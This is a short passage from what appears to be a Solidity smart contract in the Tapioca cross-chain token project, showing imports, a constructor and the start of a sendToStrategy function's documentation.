      "content": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.18;\n\n//LZ\nimport \"tapioca-sdk/dist/contracts/libraries/LzLib.sol\";\n\n//TAPIOCA\nimport {IUSDOBase} from \"tapioca-periph/contracts/interfaces/IUSDO.sol\";\nimport \"tapioca-periph/contracts/interfaces/ISwapper.sol\";\nimport \"tapioca-periph/contracts/interfaces/ITapiocaOFT.sol\";\n\nimport \"../BaseTOFTStorage.sol\";\n\n/// @title tOFT strategy module\n/// @notice tOFT module for YieldBox type actions\ncontract BaseTOFTStrategyModule is BaseTOFTStorage {\n    using SafeERC20 for IERC20;\n    using BytesLib for bytes;\n\n    constructor(\n        address _lzEndpoint,\n        address _erc20,\n        IYieldBoxBase _yieldBox,\n        string memory _name,\n        string memory _symbol,\n        uint8 _decimal,\n        uint256 _hostChainID\n    )\n        BaseTOFTStorage(\n            _lzEndpoint,\n            _erc20,\n            _yieldBox,\n            _name,\n            _symbol,\n            _decimal,\n            _hostChainID\n        )\n    {}\n\n    /// @notice sends TOFT to a specific strategy available on another layer\n    /// @param _from the sender address\n    /// @param _to the receiver address\n    /// @param amount the transferred amount\n    /// @param assetId the destination YieldBox asset id\n    /// @param lzDstChainId the destination LayerZero id\n    /// @param options the operation data\n    function sendToStrategy(\n        address _fro"
    }
  ]
}